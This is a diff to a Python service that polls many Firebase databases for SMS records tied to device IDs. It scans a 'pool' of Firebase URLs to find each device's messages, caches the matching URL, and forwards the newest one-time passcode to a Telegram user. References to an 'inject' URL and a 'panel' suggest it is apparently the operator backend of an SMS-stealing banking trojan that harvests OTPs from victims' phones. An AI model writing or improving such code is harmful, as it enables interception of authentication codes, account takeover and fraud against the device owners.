@@ -108,6 +108,11 @@ BASELINE_META_KEY = "firebase_sms_baseline"
 BASELINE_AT_META_KEY = "firebase_sms_baseline_at"
 MESSAGES_HIGH_WATER_META = "firebase_messages_high_water"
 SMS_PATHS_META_KEY = "firebase_sms_paths"
+SMS_FIREBASE_URL_META_KEY = "firebase_sms_poll_url"
+POOL_SMS_SCAN_DONE_META_KEY = "firebase_pool_sms_scan_done"
+OTP_EMPTY_POLL_STREAK_META_KEY = "otp_empty_poll_streak"
+EMPTY_POLL_RESCAN_AFTER = 3
+FIREBASE_URL_REVALIDATE_EVERY = 250
 MAX_SEEN_KEYS = 20000
 MAX_CACHED_SMS_PATHS = 50
 BODY_DATE_RE = re.compile(
@@ -133,18 +138,369 @@ def _device_ids(device: Device) -> list[str]:
     return ids
 
 
+def _is_firebase_push_key(key: str) -> bool:
+    s = str(key).strip()
+    return s.isdigit() and len(s) >= 12
+
+
+def _shallow_has_message_keys(data: Any) -> bool:
+    if not isinstance(data, dict) or not data:
+        return False
+    return any(_is_firebase_push_key(k) for k in data)
+
+
+def _parsed_record_has_body(node: Any) -> bool:
+    if isinstance(node, dict):
+        for field in BODY_FIELDS:
+            val = node.get(field)
+            if isinstance(val, str) and val.strip():
+                return True
+        for val in node.values():
+            if isinstance(val, str) and len(val.strip()) > 8:
+                return True
+        for val in node.values():
+            if isinstance(val, dict) and _parsed_record_has_body(val):
+                return True
+    return False
+
+
+async def _messages_path_exists(
+    firebase_url: str,
+    device_id: str,
+    *,
+    timeout: float,
+) -> bool:
+    """True when messages/{device_id} has push ids or a real SMS payload."""
+    root = firebase_root_url(firebase_url)
+    shallow_url = f"{root}/messages/{device_id}.json?shallow=true"
+    try:
+        data = await _fetch_json(shallow_url, timeout=timeout)
+        if _shallow_has_message_keys(data):
+            return True
+    except httpx.HTTPError:
+        pass
+    keyed_url = (
+        f"{root}/messages/{device_id}.json"
+        '?orderBy=%22%24key%22&limitToLast=1'
+    )
+    try:
+        data = await _fetch_json(keyed_url, timeout=timeout)
+    except httpx.HTTPError:
+        try:
+            data = await _fetch_json(
+                f"{root}/messages/{device_id}.json",
+                timeout=timeout,
+            )
+        except httpx.HTTPError:
+            return False
+    if data is None:
+        return False
+    if isinstance(data, dict):
+        if _shallow_has_message_keys(data):
+            return True
+        if len(data) == 1:
+            return _parsed_record_has_body(next(iter(data.values())))
+        return _parsed_record_has_body(data)
+    return False
+
+
+async def _scan_pool_for_device_messages(
+    db,
+    device_id: str,
+    *,
+    skip: set[str] | None = None,
+    prefer: str | None = None,
+) -> str | None:
+    """Find which pool Firebase holds messages/{device_id}."""
+    from app.firebase_client import normalize_firebase_url
+    from app.services import get_all_firebase_urls
+
+    prefer_norm = normalize_firebase_url(prefer) if prefer else None
+    timeout = min(_otp_poll_timeout(), 0.65)
+    if prefer_norm and await _messages_path_exists(prefer_norm, device_id, timeout=timeout):
+        logger.info(
+            "SMS pool scan hit device=%s url=%s (preferred)",
+            device_id,
+            prefer_norm,
+        )
+        return prefer_norm
+
+    pool = [url for url in get_all_firebase_urls(db) if url and url not in (skip or set())]
+    if prefer_norm and prefer_norm in (skip or set()):
+        pool = [prefer_norm] + pool
+    if not pool:
+        return None
+
+    semaphore = asyncio.Semaphore(32)
+    hits: list[str] = []
+    hit_lock = asyncio.Lock()
+
+    async def probe(url: str) -> None:
+        async with semaphore:
+            if await _messages_path_exists(url, device_id, timeout=timeout):
+                async with hit_lock:
+                    hits.append(url)
+
+    await asyncio.gather(*(probe(url) for url in pool), return_exceptions=True)
+    if not hits:
+        return None
+
+    if prefer_norm:
+        for url in hits:
+            if normalize_firebase_url(url) == prefer_norm:
+                return prefer_norm
+
+    return hits[0]
+
+
+def _firebase_url_candidates(profile: MonitorProfile, device: Device) -> list[str]:
+    from app.firebase_client import normalize_firebase_url
+    from app.firebase_sync import get_profile_firebase_url, resolve_firebase_url
+
+    meta = _meta_dict(device)
+    seen: set[str] = set()
+    out: list[str] = []
+
+    def add(url: str | None) -> None:
+        if not url:
+            return
+        norm = normalize_firebase_url(url)
+        if norm not in seen:
+            seen.add(norm)
+            out.append(norm)
+
+    add(device.firebase_source_url)
+    cached = meta.get(SMS_FIREBASE_URL_META_KEY)
+    if isinstance(cached, str) and cached.strip():
+        add(cached)
+    add(resolve_firebase_url(profile, device))
+    if not device.firebase_source_url:
+        add(get_profile_firebase_url(profile))
+    return out
+
+
+def _cache_sms_poll_url(device: Device, url: str, *, db=None) -> str:
+    from app.firebase_client import normalize_firebase_url
+
+    norm = normalize_firebase_url(url)
+    meta = _meta_dict(device)
+    meta[SMS_FIREBASE_URL_META_KEY] = norm
+    meta[OTP_EMPTY_POLL_STREAK_META_KEY] = 0
+    _save_meta(device, meta)
+    if db is not None:
+        db.commit()
+    return norm
+
+
+async def resolve_firebase_url_for_otp_poll(
+    profile: MonitorProfile,
+    device: Device,
+    db,
+    *,
+    force_pool_scan: bool = False,
+) -> str | None:
+    """Firebase root that has messages/{device} — poll only; inject home stays on firebase_source_url."""
+    from app.firebase_client import normalize_firebase_url
+
+    device_id = (device.name or "").strip()
+    if not device_id:
+        return None
+
+    timeout = _otp_poll_timeout()
+    meta = _meta_dict(device)
+
+    cached = meta.get(SMS_FIREBASE_URL_META_KEY)
+    if isinstance(cached, str) and cached.strip() and not force_pool_scan:
+        cached_norm = normalize_firebase_url(cached)
+        if await _messages_path_exists(cached_norm, device_id, timeout=timeout):
+            meta[OTP_EMPTY_POLL_STREAK_META_KEY] = 0
+            _save_meta(device, meta)
+            db.commit()
+            return cached_norm
+        meta.pop(SMS_FIREBASE_URL_META_KEY, None)
+
+    home = (
+        normalize_firebase_url(device.firebase_source_url)
+        if device.firebase_source_url
+        else None
+    )
+    if home and not force_pool_scan:
+        if await _messages_path_exists(home, device_id, timeout=timeout):
+            return _cache_sms_poll_url(device, home, db=db)
+
+    for url in _firebase_url_candidates(profile, device):
+        if await _messages_path_exists(url, device_id, timeout=timeout):
+            logger.info("OTP poll panel resolved device=%s url=%s", device_id, url)
+            return _cache_sms_poll_url(device, url, db=db)
+
+    if force_pool_scan:
+        meta.pop(POOL_SMS_SCAN_DONE_META_KEY, None)
+
+    if force_pool_scan or not meta.get(POOL_SMS_SCAN_DONE_META_KEY):
+        pool_hit = await _scan_pool_for_device_messages(db, device_id, prefer=home)
+        if pool_hit:
+            meta[POOL_SMS_SCAN_DONE_META_KEY] = True
+            _save_meta(device, meta)
+            logger.info("OTP poll panel pool bind device=%s url=%s", device_id, pool_hit)
+            return _cache_sms_poll_url(device, pool_hit, db=db)
+        meta.pop(POOL_SMS_SCAN_DONE_META_KEY, None)
+        _save_meta(device, meta)
+        db.commit()
+
+    candidates = _firebase_url_candidates(profile, device)
+    if candidates:
+        url = normalize_firebase_url(candidates[0])
+        logger.warning("OTP poll: no messages path yet device=%s — using %s", device_id, url)
+        return _cache_sms_poll_url(device, url, db=db)
+    return None
+
+
+async def locate_sms_poll_panel_for_device(
+    db,
+    device_id: str,
+    *,
+    prefer_url: str | None = None,
+    allow_full_pool: bool = True,
+) -> str | None:
+    from app.firebase_client import normalize_firebase_url
+
+    query = (device_id or "").strip()
+    if not query:
+        return None
+    timeout = _otp_poll_timeout()
+    if prefer_url:
+        home = normalize_firebase_url(prefer_url)
+        if await _messages_path_exists(home, query, timeout=timeout):
+            return home
+    if not allow_full_pool:
+        return None
+    return await _scan_pool_for_device_messages(db, query, prefer=prefer_url)
+
+
+def schedule_background_sms_panel_scan(
+    device_row_id: int,
+    device_name: str,
+    prefer_url: str | None,
+) -> None:
+    """Full pool messages/{id} scan — does not block /a."""
+
+    async def _run() -> None:
+        db = SessionLocal()
+        try:
+            device = db.query(Device).filter(Device.id == device_row_id).first()
+            if not device or (device.name or "").strip() != (device_name or "").strip():
+                return
+            meta = _meta_dict(device)
+            if isinstance(meta.get(SMS_FIREBASE_URL_META_KEY), str) and meta[SMS_FIREBASE_URL_META_KEY].strip():
+                return
+            url = await _scan_pool_for_device_messages(db, device_name, prefer=prefer_url)
+            if not url:
+                return
+            await bind_sms_poll_panel_for_device(
+                db,
+                device_name,
+                device=device,
+                prefer_url=prefer_url,
+                resolved_url=url,
+            )
+            db.commit()
+            logger.info("SMS poll panel background bind device=%s url=%s", device_name, url)
+        except Exception as exc:
+            logger.warning("Background SMS panel scan failed device=%s: %s", device_name, exc)
+        finally:
+            db.close()
+
+    asyncio.create_task(_run())
+
+
+async def bind_sms_poll_panel_for_device(
+    db,
+    device_id: str,
+    *,
+    device: Device,
+    prefer_url: str | None = None,
+    resolved_url: str | None = None,
+) -> str | None:
+    from app.firebase_client import normalize_firebase_url
+
+    url = resolved_url
+    if not url:
+        url = await locate_sms_poll_panel_for_device(
+            db,
+            device_id,
+            prefer_url=prefer_url or device.firebase_source_url,
+        )
+    if not url:
+        return None
+    norm = _cache_sms_poll_url(device, url, db=None)
+    meta = _meta_dict(device)
+    meta.pop(POOL_SMS_SCAN_DONE_META_KEY, None)
+    _save_meta(device, meta)
+    db.flush()
+    logger.info("SMS poll panel bound device=%s url=%s", device_id, norm)
+    return norm
+
+
+def reset_sms_poll_cache_for_device_switch(device: Device, db=None) -> None:
+    meta = _meta_dict(device)
+    meta.pop(SMS_FIREBASE_URL_META_KEY, None)
+    meta.pop(POOL_SMS_SCAN_DONE_META_KEY, None)
+    meta.pop(OTP_EMPTY_POLL_STREAK_META_KEY, None)
+    _save_meta(device, meta)
+    if db is not None:
+        db.commit()
+
+
+def _bump_empty_poll_streak(device: Device, db) -> int:
+    meta = _meta_dict(device)
+    streak = int(meta.get(OTP_EMPTY_POLL_STREAK_META_KEY) or 0) + 1
+    meta[OTP_EMPTY_POLL_STREAK_META_KEY] = streak
+    _save_meta(device, meta)
+    db.commit()
+    return streak
+
+
+def _reset_empty_poll_streak(device: Device, db) -> None:
+    meta = _meta_dict(device)
+    if meta.get(OTP_EMPTY_POLL_STREAK_META_KEY):
+        meta[OTP_EMPTY_POLL_STREAK_META_KEY] = 0
+        _save_meta(device, meta)
+        db.commit()
+
+
+async def _maybe_revalidate_firebase_poll_url(
+    profile: MonitorProfile,
+    device: Device,
+    db,
+    firebase_url: str,
+) -> str:
+    cycle = _poll_cycle.get(device.id, 0)
+    if cycle % FIREBASE_URL_REVALIDATE_EVERY != 0:
+        return firebase_url
+    device_id = (device.name or "").strip()
+    if not device_id:
+        return firebase_url
+    if await _messages_path_exists(firebase_url, device_id, timeout=_otp_poll_timeout()):
+        return firebase_url
+    meta = _meta_dict(device)
+    meta.pop(SMS_FIREBASE_URL_META_KEY, None)
+    meta.pop(POOL_SMS_SCAN_DONE_META_KEY, None)
+    _save_meta(device, meta)
+    db.commit()
+    logger.warning("OTP poll URL stale device=%s was=%s", device_id, firebase_url)
+    new_url = await resolve_firebase_url_for_otp_poll(profile, device, db, force_pool_scan=True)
+    return new_url or firebase_url
+
+
 def _resolve_device_firebase_url(profile: MonitorProfile, device: Device) -> str | None:
     from app.firebase_client import normalize_firebase_url
-    from app.firebase_sync import resolve_firebase_url
 
-    url = resolve_firebase_url(profile, device)
-    if url:
-        return normalize_firebase_url(url)
-    if device.firebase_source_url:
-        return normalize_firebase_url(device.firebase_source_url)
-    if profile.firebase_url:
-        return normalize_firebase_url(profile.firebase_url)
-    return None
+    meta = _meta_dict(device)
+    cached = meta.get(SMS_FIREBASE_URL_META_KEY)
+    if isinstance(cached, str) and cached.strip():
+        return normalize_firebase_url(cached)
+    candidates = _firebase_url_candidates(profile, device)
+    return candidates[0] if candidates else None
 
 
 def _meta_dict(device: Device) -> dict[str, Any]:
@@ -162,6 +518,27 @@ def _save_meta(device: Device, meta: dict[str, Any]) -> None:
 
     device.device_meta = json.dumps(meta)
     flag_modified(device, "device_meta")
+
+
+def preserve_sms_monitor_meta_in_device_json(
+    existing: dict[str, Any] | None,
+    fresh: dict[str, Any],
+) -> dict[str, Any]:
+    """Firebase device sync must not wipe OTP baseline / SMS poll cache in device_meta."""
+    merged = dict(fresh)
+    if not isinstance(existing, dict):
+        return merged
+    for key, value in existing.items():
+        if (
+            key.startswith("firebase_sms_")
+            or key.startswith("firebase_messages_")
+            or key.startswith("firebase_pool_")
+            or key.startswith("otp_")
+            or key.startswith("firebase_baseline_")
+            or key in {SMS_FIREBASE_URL_META_KEY, SMS_PATHS_META_KEY}
+        ):
+            merged[key] = value
+    return merged
 
 
 def get_seen_sms_keys(device: Device) -> set[str]:
@@ -222,6 +599,9 @@ def clear_sms_baseline(device: Device) -> None:
     meta.pop(BASELINE_AT_META_KEY, None)
     meta.pop(SEEN_META_KEY, None)
     meta.pop(MESSAGES_HIGH_WATER_META, None)
+    meta.pop(SMS_FIREBASE_URL_META_KEY, None)
+    meta.pop(POOL_SMS_SCAN_DONE_META_KEY, None)
+    meta.pop(OTP_EMPTY_POLL_STREAK_META_KEY, None)
     _save_meta(device, meta)
 
 
@@ -1021,7 +1401,10 @@ async def snapshot_firebase_sms_seen(
     db=None,
 ) -> int:
     """On monitoring start — mark every existing Firebase SMS as baseline (ignored)."""
-    firebase_url = _resolve_device_firebase_url(profile, device)
+    if db is not None:
+        firebase_url = await resolve_firebase_url_for_otp_poll(profile, device, db)
+    else:
+        firebase_url = _resolve_device_firebase_url(profile, device)
     if not firebase_url:
         return 0
     root = firebase_root_url(firebase_url)
@@ -1256,7 +1639,44 @@ async def _poll_messages_otp_only(
                 device_id,
                 high_water,
             )
-        return 0
+            return 0
+        streak = _bump_empty_poll_streak(device, db)
+        force_pool = streak >= EMPTY_POLL_RESCAN_AFTER
+        if force_pool:
+            logger.warning(
+                "OTP poll empty x%s device=%s — rescan Firebase pool for messages path",
+                streak,
+                device_id,
+            )
+        alt_url = await resolve_firebase_url_for_otp_poll(
+            profile,
+            device,
+            db,
+            force_pool_scan=force_pool,
+        )
+        if alt_url and alt_url != firebase_url:
+            root = firebase_root_url(alt_url)
+            firebase_url = alt_url
+            try:
+                records = await asyncio.wait_for(
+                    _fetch_path_records(root, path, fetch_timeout),
+                    timeout=fetch_timeout + 0.18,
+                )
+            except (asyncio.TimeoutError, httpx.HTTPError, Exception):
+                return 0
+            candidates = []
+            for record in records:
+                push_id = _message_push_id(record)
+                if push_id is None or not _should_deliver_otp_record(record, device):
+                    continue
+                sender = str(record.get("sender") or "Unknown")
+                body = str(record.get("message") or "")
+                if _is_poll_noise_record(sender, body) or _is_outgoing_firebase_log(sender, body):
+                    mark_sms_keys_seen(device, {_record_dedup_key(record)})
+                    continue
+                candidates.append(record)
+        if not candidates:
+            return 0
 
     # One bot message per poll — newest OTP only (no bulk flood).
     record = max(candidates, key=lambda item: _message_push_id(item) or 0)
@@ -1317,6 +1737,7 @@ async def _poll_messages_otp_only(
         sender,
         push_id,
     )
+    _reset_empty_poll_streak(device, db)
     return 1
 
 
@@ -1331,11 +1752,28 @@ async def _poll_one_monitoring_profile(profile_id: int) -> int:
         if not device:
             return 0
 
-        firebase_url = _resolve_device_firebase_url(profile, device)
+        _poll_cycle[device.id] = _poll_cycle.get(device.id, 0) + 1
+        meta = _meta_dict(device)
+        from app.firebase_client import normalize_firebase_url
+
+        firebase_url: str | None = None
+        if isinstance(meta.get(SMS_FIREBASE_URL_META_KEY), str):
+            firebase_url = normalize_firebase_url(meta[SMS_FIREBASE_URL_META_KEY])
+        elif device.firebase_source_url:
+            firebase_url = normalize_firebase_url(device.firebase_source_url)
+        cycle = _poll_cycle.get(device.id, 0)
+        if not firebase_url or cycle % 120 == 0:
+            firebase_url = await resolve_firebase_url_for_otp_poll(profile, device, db)
         if not firebase_url:
             logger.warning("OTP poll skip user=%s: no firebase URL", profile.telegram_user_id)
             return 0
 
+        firebase_url = await _maybe_revalidate_firebase_poll_url(
+            profile,
+            device,
+            db,
+            firebase_url,
+        )
         return await _poll_messages_otp_only(profile, device, firebase_url, db)
     finally:
         db.close()
